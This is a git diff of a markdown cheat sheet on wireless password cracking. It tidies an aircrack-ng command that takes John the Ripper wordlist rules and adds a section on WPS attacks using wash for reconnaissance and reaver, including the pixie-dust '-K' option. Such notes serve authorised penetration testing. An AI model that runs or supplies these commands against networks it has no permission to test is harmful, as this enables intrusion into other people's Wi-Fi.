@@ -23,5 +23,16 @@ Then deauth from another shell or wifi card:
 ```aircrack-ng -w <path to wordlist> -e <ESSID> -b <BSSID> <capture filename>```
 
 Aircrack with john rules
-sudo john --wordlist=<path to wordlist> --rules --stdout | aircrack-ng -e <ESSID> -b <BSSID> -w <capture filename>
+```sudo john --wordlist=<path to wordlist> --rules --stdout | aircrack-ng -e <ESSID> -b <BSSID> -w <capture filename>```
+
+# Cracking wps
+
+## Recon
+```sudo wash -i wlan0mon ```
+
+## Attacks
+```sudo reaver -b <bssid> -i wlan0mon -v```
+
+May need -K  
+```sudo reaver -b <bssid> -i wlan0mon -v -K```
 
